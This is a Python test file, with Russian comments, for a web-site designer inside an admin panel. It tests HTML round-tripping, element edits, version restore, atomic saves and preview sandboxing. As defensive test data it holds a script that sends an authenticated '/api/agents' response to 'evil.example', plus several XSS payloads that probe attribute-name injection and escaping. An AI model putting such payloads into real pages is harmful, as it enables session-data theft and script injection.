"""Тесты веб-дизайнера: генерация, точечные правки, версии, превью с пикером.

Сеть не трогается: AI-правка проверяется только в честном отказе «нет модели»
(реестр в тестах пуст) — сами операции правки детерминированы и покрыты ниже.
"""
from __future__ import annotations

import re

import pytest
from fastapi import HTTPException

import pytest

from bcc.web_designer_dom import (
    apply_edit, assign_bd_ids, find_by_path, inject_preview,
    parse_document, serialize,
)

SIMPLE = """<!DOCTYPE html>
<html><head><title>t</title></head>
<body>
<h1>Заголовок</h1>
<div class="cards"><p class="a">первый</p><p>второй</p></div>
</body></html>
"""

# Нумерация bd-id детерминирована (обход в глубину):
# bd-1 html, bd-2 head, bd-3 title, bd-4 body, bd-5 h1, bd-6 div, bd-7 p.a, bd-8 p


# ---------------------------------------------------------------- DOM-модуль

def test_dom_roundtrip_preserves_entities_comments_and_script():
    # <br/> нормализуется в <br> — семантика та же, остальное дословно
    messy = ("<html><body><!-- привет --><p>A &amp; B &lt;ok&gt;</p>"
             "<script>if (1<2){alert('x&y')}</script><br></body></html>")
    assert serialize(parse_document(messy)) == messy


def test_dom_bd_ids_deterministic_and_found_in_edit():
    _, desc = apply_edit(SIMPLE, {"op": "style", "bd_id": "bd-7", "props": {"color": "red"}})
    assert desc["tag"] == "p" and desc["classes"] == ["a"]


def test_dom_edit_by_short_path_and_text():
    new_html, desc = apply_edit(SIMPLE, {"op": "text", "path": "p", "text": "замена"})
    assert "замена" in new_html and desc["tag"] == "p"


def test_dom_path_nth_of_type():
    root = parse_document(SIMPLE)
    assign_bd_ids(root)
    assert find_by_path(root, "html > body > div:nth-of-type(1) > p:nth-of-type(2)") is not None
    assert find_by_path(root, "html > body > div:nth-of-type(1) > p:nth-of-type(5)") is None


def test_dom_replace_and_delete():
    replaced, _ = apply_edit(SIMPLE, {"op": "replace", "bd_id": "bd-5", "html": "<h2 id=n>Новый</h2>"})
    # фрагмент ложится ДОСЛОВНО: сборка не переписывает кавычки за владельца
    assert "<h2 id=n>Новый</h2>" in replaced
    deleted, desc = apply_edit(replaced, {"op": "delete", "bd_id": "bd-5"})
    assert "Новый" not in deleted and desc["tag"] == "h2"


def test_dom_errors_are_explicit():
    with pytest.raises(LookupError):
        apply_edit(SIMPLE, {"op": "text", "bd_id": "bd-999", "text": "x"})
    with pytest.raises(ValueError):
        apply_edit(SIMPLE, {"op": "unknown", "bd_id": "bd-3"})
    with pytest.raises(ValueError):
        apply_edit(SIMPLE, {"op": "style", "bd_id": "bd-3", "props": {}})


def test_inject_preview_numbers_elements_and_stores_clean():
    injected = inject_preview(SIMPLE)
    assert "data-bd-id" in injected and "bd-label" in injected
    # хранимый код без служебных номеров
    assert "data-bd-id" not in SIMPLE
    edited, _ = apply_edit(SIMPLE, {"op": "style", "bd_id": "bd-3", "props": {"color": "red"}})
    assert "data-bd-id" not in edited


# ---------------------------------------------------------------- API

async def _create(env, **kw):
    body = {"name": "Кофейня Север", "prompt": "кафе с доставкой", "template": "auto", **kw}
    res = await env.client.post("/api/web-designer/projects", json=body)
    assert res.status_code == 200, res.text
    return res.json()


async def test_create_generates_site_and_preview_picks(env):
    data = await _create(env)
    meta, code = data["meta"], data["code"]
    assert meta["version"] == 1
    assert meta["template"] == "cafe"          # «кафе с доставкой» → шаблон кафе
    assert code.lstrip().lower().startswith("<!doctype html")
    assert "Забронировать столик" in code

    preview = await env.client.get(f"/api/web-designer/projects/{meta['id']}/preview")
    assert preview.status_code == 200
    assert "data-bd-id" in preview.text and "bd-preview" in preview.text
    # а в сохранённом коде маркеров нет
    project = await env.client.get(f"/api/web-designer/projects/{meta['id']}")
    assert "data-bd-id" not in project.json()["code"]


async def test_blank_project_and_code_save(env):
    data = await _create(env, template="blank")
    pid = data["meta"]["id"]
    res = await env.client.put(f"/api/web-designer/projects/{pid}/code",
                               json={"html": SIMPLE, "note": "первая вёрстка"})
    assert res.status_code == 200 and res.json()["meta"]["version"] == 2
    project = await env.client.get(f"/api/web-designer/projects/{pid}")
    assert "Заголовок" in project.json()["code"]
    # не-HTML сервер честно не берёт
    bad = await env.client.put(f"/api/web-designer/projects/{pid}/code",
                               json={"html": "просто текст без тегов"})
    assert bad.status_code == 422


async def test_point_edits_via_api(env):
    data = await _create(env, template="blank")
    pid = data["meta"]["id"]
    await env.client.put(f"/api/web-designer/projects/{pid}/code", json={"html": SIMPLE})

    style = await env.client.post(f"/api/web-designer/projects/{pid}/edit", json={
        "op": "style", "bd_id": "bd-7", "props": {"color": "#ff0000", "font-size": "30px"}})
    assert style.status_code == 200
    assert style.json()["element"]["tag"] == "p"
    project = await env.client.get(f"/api/web-designer/projects/{pid}")
    assert "color: #ff0000" in project.json()["code"]

    text = await env.client.post(f"/api/web-designer/projects/{pid}/edit", json={
        "op": "text", "path": "html > body > h1", "text": "Новый заголовок"})
    assert text.status_code == 200
    project = await env.client.get(f"/api/web-designer/projects/{pid}")
    assert "Новый заголовок" in project.json()["code"]

    missing = await env.client.post(f"/api/web-designer/projects/{pid}/edit", json={
        "op": "delete", "bd_id": "bd-999"})
    assert missing.status_code == 404
    bad_op = await env.client.post(f"/api/web-designer/projects/{pid}/edit", json={
        "op": "magic", "bd_id": "bd-3"})
    assert bad_op.status_code == 422


async def test_versions_and_restore(env):
    data = await _create(env, template="blank")
    pid = data["meta"]["id"]
    await env.client.put(f"/api/web-designer/projects/{pid}/code",
                         json={"html": SIMPLE, "note": "первая вёрстка"})
    await env.client.put(f"/api/web-designer/projects/{pid}/code",
                         json={"html": SIMPLE.replace("Заголовок", "Вторая версия")})
    versions = (await env.client.get(f"/api/web-designer/projects/{pid}/versions")).json()["items"]
    assert [v["version"] for v in versions] == [1, 2, 3]
    assert versions[0]["note"] == "пустой проект"
    assert versions[1]["note"] == "первая вёрстка"

    restore = await env.client.post(f"/api/web-designer/projects/{pid}/versions/1/restore")
    assert restore.status_code == 200
    project = await env.client.get(f"/api/web-designer/projects/{pid}")
    assert "Вторая версия" not in project.json()["code"]
    assert project.json()["meta"]["version"] == 4

    missing = await env.client.post(f"/api/web-designer/projects/{pid}/versions/99/restore")
    assert missing.status_code == 404


async def test_generate_endpoint_steps_and_detection(env):
    data = await _create(env, template="blank")
    pid = data["meta"]["id"]
    res = await env.client.post(f"/api/web-designer/projects/{pid}/generate",
                                json={"prompt": "магазин одежды в тёмной теме", "template": "auto"})
    body = res.json()
    assert res.status_code == 200
    assert body["template"] == "shop" and body["palette"] == "dark"
    assert len(body["steps"]) >= 5
    for step in body["steps"]:
        assert step.strip().endswith("</html>")
    project = await env.client.get(f"/api/web-designer/projects/{pid}")
    assert project.json()["meta"]["version"] == 2
    assert "Хиты продаж" in project.json()["code"]


async def test_templates_catalog(env):
    res = await env.client.get("/api/web-designer/templates")
    assert res.status_code == 200
    ids = [t["id"] for t in res.json()["items"]]
    assert {"landing", "portfolio", "cafe", "shop", "blog", "agency"} <= set(ids)


async def test_ai_edit_honest_without_model(env):
    data = await _create(env, template="blank")
    pid = data["meta"]["id"]
    res = await env.client.post(f"/api/web-designer/projects/{pid}/ai-edit",
                                json={"prompt": "сделай заголовок крупнее"})
    assert res.status_code == 409
    # форма ошибки API: {error: {message}}
    assert "модел" in res.json()["error"]["message"].lower()


async def test_list_and_delete_project(env):
    data = await _create(env)
    pid = data["meta"]["id"]
    listing = (await env.client.get("/api/web-designer/projects")).json()["items"]
    assert any(p["id"] == pid for p in listing)
    deleted = await env.client.delete(f"/api/web-designer/projects/{pid}")
    assert deleted.status_code == 200
    gone = await env.client.get(f"/api/web-designer/projects/{pid}")
    assert gone.status_code == 404


# ------------------------------------------------- изоляция превью (P0)

async def test_preview_of_hostile_code_cannot_reach_the_panel(env):
    """Превью — чужой код на origin панели. Без песочницы скрипт внутри него
    прочитал бы CSRF-токен из localStorage и пошёл бы с cookie сессии в /api,
    вплоть до terminal.run. Ограничение обязано приходить С СЕРВЕРА: атрибут
    iframe можно забыть, заголовок — нет."""
    data = await _create(env)
    pid = data["meta"]["id"]
    hostile = ("<!doctype html><html><body><h1>визитка</h1>"
               "<script>fetch('/api/agents',{credentials:'include'})"
               ".then(r=>r.text()).then(t=>fetch('https://evil.example/'+encodeURIComponent(t)));"
               "</script></body></html>")
    res = await env.client.put(f"/api/web-designer/projects/{pid}/code",
                               json={"html": hostile, "note": "вставлен чужой код"})
    assert res.status_code == 200, res.text

    preview = await env.client.get(f"/api/web-designer/projects/{pid}/preview")
    assert preview.status_code == 200
    csp = preview.headers.get("content-security-policy", "")
    # непрозрачный origin: ни cookie, ни localStorage, ни /api из кадра
    assert "sandbox allow-scripts" in csp
    assert "allow-same-origin" not in csp
    assert preview.headers.get("x-content-type-options") == "nosniff"
    # код сохранён как есть — панель ничего не «чистит» втихую и не притворяется,
    # что обезвредила скрипт: он просто исполняется в песочнице
    assert "evil.example" in preview.text


def test_preview_iframe_is_sandboxed_in_the_ui():
    """Вторая половина того же инварианта: кадр в UI объявлен песочницей и
    сообщения принимаются только от него самого."""
    from pathlib import Path
    page = (Path(__file__).resolve().parents[1] / "ui" / "pages" / "web_designer.js").read_text(encoding="utf-8")
    # значение атрибута, а не текст файла: слова «allow-same-origin» законно
    # встречаются в комментарии, который объясняет, почему его там нет
    values = re.findall(r"sandbox:\s*'([^']*)'", page)
    assert values == ["allow-scripts"], values
    assert "ev.source !== frame.contentWindow" in page


# ------------------------------------------------- границы хранения

async def test_listed_version_can_always_be_restored(env):
    """Снимки чистились лексикографически: «v10» сортируется раньше «v9», поэтому
    срез удалял файлы версий, которые остаются в списке, и откат к ним отвечал
    404. Список версий и каталог снимков обязаны говорить одно и то же."""
    from bcc.features import web_designer as wd
    data = await _create(env, template="blank")
    pid = data["meta"]["id"]
    for i in range(wd.MAX_VERSIONS + 12):
        res = await env.client.put(f"/api/web-designer/projects/{pid}/code",
                                   json={"html": f"<html><body><p>{i}</p></body></html>",
                                         "note": f"правка {i}"})
        assert res.status_code == 200, res.text
    listed = (await env.client.get(f"/api/web-designer/projects/{pid}/versions")).json()["items"]
    assert len(listed) == wd.MAX_VERSIONS
    for item in listed:
        res = await env.client.post(
            f"/api/web-designer/projects/{pid}/versions/{item['version']}/restore")
        assert res.status_code == 200, f"версия {item['version']} в списке, но не восстановима"


async def test_oversized_document_is_refused_on_every_write_path(env):
    """Предел размера стоял в схемах запросов, но откат и ответ модели идут мимо
    них. Проверяется единственная точка записи."""
    from bcc.features import web_designer as wd
    data = await _create(env, template="blank")
    pid = data["meta"]["id"]
    pdir = wd._pdir(env.svc, int(pid))
    huge = "<html><body>" + "я" * (wd.MAX_HTML_CHARS + 1) + "</body></html>"
    with pytest.raises(HTTPException) as exc:
        wd._save_code(env.svc, pdir, huge, "слишком большой")
    assert exc.value.status_code == 413


async def test_project_limit_refuses_instead_of_hiding(env):
    """Предел применялся только к списку: проекты копились на диске, а лишние
    просто не показывались."""
    from bcc.features import web_designer as wd
    root = wd._root(env.svc)
    root.mkdir(parents=True, exist_ok=True)
    for i in range(1, wd.MAX_PROJECTS + 1):
        (root / str(i)).mkdir(exist_ok=True)
    res = await env.client.post("/api/web-designer/projects",
                                json={"name": "лишний", "prompt": "кафе", "template": "blank"})
    assert res.status_code == 409 and "предел" in res.json()["error"]["message"]


# ================================================================
# Регрессии по аудиту docs/v3/AUDIT_WEB_DESIGNER.md
#
# Общий корень всех находок ниже: точечная правка идёт через полный цикл
# parse → serialize, поэтому неточность сборки — это не артефакт превью, а
# необратимая порча сайта владельца. Поэтому большинство тестов проверяют
# ОДНО: правка одного элемента не трогает остальной документ БАЙТ В БАЙТ.
# ================================================================

def _edit_one(html, **edit):
    """Правка одного элемента; возвращает новый документ."""
    return apply_edit(html, edit)[0]


# ---------------------------------------------------------------- WD-01..04: точность разбора

@pytest.mark.parametrize("name,src", [
    ("инструкция обработки php",
     '<!doctype html><html><body><?php echo "x"; ?><h1>T</h1></body></html>'),
    ("объявление xml",
     '<?xml version="1.0"?><html><body><h1>T</h1></body></html>'),
    ("секция CDATA",
     '<html><body><![CDATA[raw < stuff]]><h1>T</h1></body></html>'),
    ("инлайновый SVG: регистр значим",
     '<html><body><svg viewBox="0 0 10 10"><linearGradient id="g"></linearGradient>'
     '<clipPath id="c"></clipPath></svg><h1>T</h1></body></html>'),
    ("регистр имён атрибутов",
     '<html><body><h1 CLASS="A" Data-X="1">T</h1></body></html>'),
    ("одинарные кавычки и голое значение",
     "<html><body><h1 class='a' data-n=7>T</h1></body></html>"),
    ("самозакрытие",
     '<html><body><br/><img src="a.png" /></body></html>'),
    ("комментарии, сущности и разметка внутри script",
     "<html><body><!-- x --><p>A &amp; B &lt;ok&gt;</p>"
     "<script>if (1<2){alert('x&y')}</script><br></body></html>"),
])
def test_roundtrip_is_byte_for_byte(name, src):
    """Сборка обязана вернуть ровно то, что разобрала.

    Каждый пункт здесь раньше терялся или искажался при ПЕРВОЙ же правке
    соседнего элемента: `<?php ?>` и CDATA исчезали, `viewBox` становился
    `viewbox`, и логотип «умирал» после смены цвета заголовка.
    """
    assert serialize(parse_document(src)) == src, name


def test_unrelated_markup_survives_a_one_element_edit():
    """Главный инвариант панели: правка ОДНОГО элемента не трогает остальное."""
    src = ('<!doctype html>\n<html lang="ru">\n<head><title>t</title></head>\n<body>\n'
           '<?php echo "меню"; ?>\n'
           '<svg viewBox="0 0 24 24"><linearGradient id="g"/><clipPath id="c"/></svg>\n'
           '<![CDATA[сырьё < тут]]>\n'
           '<h1 CLASS="Hero" Data-Role=\'title\'>Заголовок</h1>\n'
           "<p class='a' data-n=7>текст &amp; ещё</p>\n"
           '<!-- комментарий --><br/>\n'
           '</body></html>\n')
    out = _edit_one(src, op="style", path="h1", props={"color": "red"})
    # изменился ровно один тег
    assert 'style="color: red"' in out
    for fragment in ('<?php echo "меню"; ?>', 'viewBox="0 0 24 24"', '<linearGradient id="g"/>',
                     '<clipPath id="c"/>', '<![CDATA[сырьё < тут]]>',
                     "<p class='a' data-n=7>текст &amp; ещё</p>", '<!-- комментарий --><br/>',
                     '<!doctype html>', '<html lang="ru">'):
        assert fragment in out, fragment
    # и всё, что ВНЕ правленого тега, совпадает с исходником посимвольно:
    # пересобирается ровно один узел — тот, который правку и получил
    assert out[:out.index("<h1")] == src[:src.index("<h1")]
    assert out[out.index("</h1>"):] == src[src.index("</h1>"):]


def test_truncated_markup_is_kept_not_swallowed():
    """Оборванный в конце файла тег парсер выбрасывал молча — вместе с ним
    уходил кусок вёрстки владельца при любой правке."""
    src = '<html><body><h1>T</h1><div class="x"'
    out = serialize(parse_document(src))
    assert '<div class="x"' in out
    edited = _edit_one(src, op="style", path="h1", props={"color": "red"})
    assert '<div class="x"' in edited


# ---------------------------------------------------------------- WD-05: рекурсия

def test_deeply_nested_document_does_not_crash_the_panel():
    """serialize/walk_elements были рекурсивны: ~350 вложений (4 КБ при пределе
    в 2 000 000 символов) давали RecursionError → 500, после чего проект нельзя
    было ни показать, ни править."""
    deep = "<html><body>" + "<div>" * 2000 + "x" + "</div>" * 2000 + "</body></html>"
    assert serialize(parse_document(deep)) == deep
    assert "data-bd-id" in inject_preview(deep)
    edited, _ = apply_edit(deep, {"op": "style", "path": "body", "props": {"color": "red"}})
    assert edited.count("<div>") == 2000


# ---------------------------------------------------------------- WD-06: инъекция ИМЕНИ атрибута

def test_attribute_name_injection_is_refused_not_serialized():
    """P0. Значения экранировались, ИМЕНА — нет: `x" onmouseover="alert(1)`
    сохранялся живым обработчиком события. Песочница превью не даёт добраться
    до панели, но испорченный документ уезжает в экспорт, где песочницы нет."""
    src = '<html><body><h1>T</h1></body></html>'
    for hostile in ('x" onmouseover="alert(1)', 'x><script>alert(1)</script',
                    "x' onfocus='alert(1)", "x=y", "x/y", "x y"):
        with pytest.raises(ValueError):
            apply_edit(src, {"op": "attrs", "path": "h1", "attrs": {hostile: "y"}})
    # документ не изменился ни на байт
    assert _edit_one(src, op="attrs", path="h1", attrs={"data-ok": "1"}) == \
        '<html><body><h1 data-ok="1">T</h1></body></html>'


def test_escaping_of_values_text_and_style_still_holds():
    """Атака, которая ДОЛЖНА проваливаться, — и проваливается. Тест остаётся,
    чтобы будущая «оптимизация» сборки не сняла экранирование."""
    src = '<html><body><h1>T</h1></body></html>'
    out = _edit_one(src, op="attrs", path="h1", attrs={"title": 'x" onmouseover="alert(1)'})
    assert "&quot;" in out and 'onmouseover="alert(1)"' not in out
    out = _edit_one(src, op="text", path="h1", text="<img src=x onerror=alert(1)>")
    assert "<img" not in out and "&lt;img" in out
    with pytest.raises(ValueError):
        apply_edit(src, {"op": "style", "path": "h1", "props": {'color:red" onload="alert(1)': "x"}})


# ---------------------------------------------------------------- WD-07: текст сносил поддерево

def test_text_edit_does_not_silently_flatten_a_subtree():
    """Инспектор подставлял в поле «Текст» весь textContent поддерева, и
    «Применить» без единой правки схлопывало `<section>` со всеми потомками."""
    src = '<html><body><section><h2>H</h2><p>one</p><p>two</p></section></body></html>'
    with pytest.raises(ValueError):
        apply_edit(src, {"op": "text", "path": "section", "text": "H one two"})
    assert serialize(parse_document(src)) == src
    # лист правится как раньше
    assert "новый" in _edit_one(src, op="text", path="h2", text="новый")
    # и снос поддерева возможен — но только по явному согласию
    forced = _edit_one(src, op="text", path="section", text="всё заново", replace_children=True)
    assert "<h2>" not in forced and "всё заново" in forced


# ---------------------------------------------------------------- WD-08: устаревший bd_id

def test_stale_selection_is_refused_instead_of_editing_a_stranger():
    """После удаления элемента нумерация сдвигается, и старый bd-N указывает на
    ЧУЖОЙ тег. Ожидаемое имя тега из превью ловит это до записи."""
    base = '<html><body><h1>ЗАГОЛОВОК</h1><p id="keep">важный текст</p></body></html>'
    after = _edit_one(base, op="delete", bd_id="bd-3", tag="h1")   # bd-3 = h1
    assert "важный текст" in after
    # UI не сбросил выделение — второй раз тот же bd-3 указывает уже на <p>
    with pytest.raises(LookupError):
        apply_edit(after, {"op": "delete", "bd_id": "bd-3", "tag": "h1"})
    assert "важный текст" in after


# ---------------------------------------------------------------- WD-09/WD-10

def test_unbalanced_replacement_is_refused_not_half_applied():
    """Фрагмент, закрывающий обёртку, выбрасывал всё, что шло следом, — при
    ответе «Элемент заменён»."""
    src = '<html><body><div id="wrap"><span id="t">x</span><p>after</p></div></body></html>'
    with pytest.raises(ValueError):
        apply_edit(src, {"op": "replace", "path": "span#t", "html": "<b>NEW</b></div><p>LOST</p>"})
    assert serialize(parse_document(src)) == src


def test_owner_data_bd_id_is_not_destroyed():
    """Служебная нумерация жила в attrs и затирала собственный `data-bd-id`
    владельца при каждой правке."""
    src = '<html><body><h1 data-bd-id="mine">T</h1></body></html>'
    out = _edit_one(src, op="style", path="h1", props={"color": "red"})
    assert 'data-bd-id="mine"' in out


# ---------------------------------------------------------------- WD-11: генератор

def test_generator_escapes_the_project_name():
    """Имя проекта — ввод владельца, а уезжало в `<title>`, логотип и `<h1>`
    без экранирования: «Кафе"><script>…» становился живым скриптом внутри
    СОХРАНЁННОГО сайта и дальше — в экспорте, где песочницы нет."""
    from bcc import web_designer_gen as gen
    result = gen.generate("кафе с доставкой", name='Кафе"><script>alert(1)</script>')
    final = result["steps"][-1]
    assert "<script>alert(1)</script>" not in final
    assert "&lt;script&gt;" in final
    # имя в метаданных остаётся человеческим, экранирование живёт только в разметке
    assert "<script>" in result["name"]


# ---------------------------------------------------------------- WD-12..16: хранение и гонки

async def test_project_id_is_a_number_for_the_ui(env):
    """`meta.id` был строкой, а UI сравнивал его с числом через ===: «последний
    проект» и ссылка ?project=N не срабатывали НИКОГДА."""
    data = await _create(env, template="blank")
    assert isinstance(data["meta"]["id"], int)
    listing = (await env.client.get("/api/web-designer/projects")).json()["items"]
    assert all(isinstance(item["id"], int) for item in listing)


def test_ui_restores_last_project_and_deep_link():
    """Вторая половина того же инварианта — на стороне UI: сравнение по
    значению, а не по типу."""
    from pathlib import Path
    page = (Path(__file__).resolve().parents[1] / "ui" / "pages" / "web_designer.js").read_text(encoding="utf-8")
    assert "Number(p.id) === Number(state.id)" in page
    assert "p.id === state.id" not in page
    # несохранённый набор не затирается фоновой перезагрузкой состояния
    assert "!state.dirty && document.activeElement !== editorNode" in page
    # правка несёт версию, на которой построена
    assert "base_version: baseVersion()" in page


async def test_concurrent_edit_is_reported_not_silently_overwritten(env):
    """Потерянное обновление: `ai-edit` читал код ДО await и писал ПОСЛЕ, без
    сверки. Ответ модели ложился поверх ручной правки владельца, и endpoint
    отвечал «правка внесена». Чужая работа не затирается молча."""
    from bcc.features import web_designer as wd
    data = await _create(env, template="blank")
    pid = data["meta"]["id"]
    base = (await env.client.get(f"/api/web-designer/projects/{pid}")).json()["meta"]["version"]
    # владелец сохранил свою правку
    mine = await env.client.put(f"/api/web-designer/projects/{pid}/code",
                                json={"html": "<html><body><p>МОЁ</p></body></html>",
                                      "base_version": base})
    assert mine.status_code == 200
    # вторая вкладка (или ответ модели) строилась на устаревшей версии
    late = await env.client.put(f"/api/web-designer/projects/{pid}/code",
                                json={"html": "<html><body><p>ПОЗДНЯЯ</p></body></html>",
                                      "base_version": base})
    assert late.status_code == 409, late.text
    assert "МОЁ" in (await env.client.get(f"/api/web-designer/projects/{pid}")).json()["code"]

    stale_edit = await env.client.post(f"/api/web-designer/projects/{pid}/edit",
                                       json={"op": "style", "path": "p",
                                             "props": {"color": "red"}, "base_version": base})
    assert stale_edit.status_code == 409, stale_edit.text


async def test_live_file_is_written_atomically(env):
    """`current.html` писался напрямую: обрыв на середине оставлял владельцу
    полупустой сайт. Запись идёт во временный файл рядом и os.replace — то
    есть либо старая версия целиком, либо новая целиком, третьего нет."""
    from bcc.features import web_designer as wd
    data = await _create(env, template="blank")
    pid = data["meta"]["id"]
    pdir = wd._pdir(env.svc, int(pid))
    before = wd._read_code(pdir)
    assert before.strip()

    real_replace = wd.os.replace
    def die(*a, **kw):                       # процесс умер между записью и установкой
        raise OSError("обрыв до установки файла")
    wd.os.replace = die
    try:
        with pytest.raises(OSError):
            wd._save_code(env.svc, pdir,
                          "<html><body><p>" + "Д" * 400 + "</p></body></html>", "обрыв")
    finally:
        wd.os.replace = real_replace

    # владелец не получил половину документа: файл ровно тот, что был
    assert wd._read_code(pdir) == before
    # и мусор рядом не остался
    assert not list(pdir.glob(".current.html.*"))
    assert not list((pdir / "history").glob(".v*.tmp"))

    # обычная запись по-прежнему проходит
    meta = wd._save_code(env.svc, pdir, "<html><body><p>цел</p></body></html>", "после обрыва")
    assert wd._read_code(pdir) == "<html><body><p>цел</p></body></html>"
    assert meta["version"] >= 2
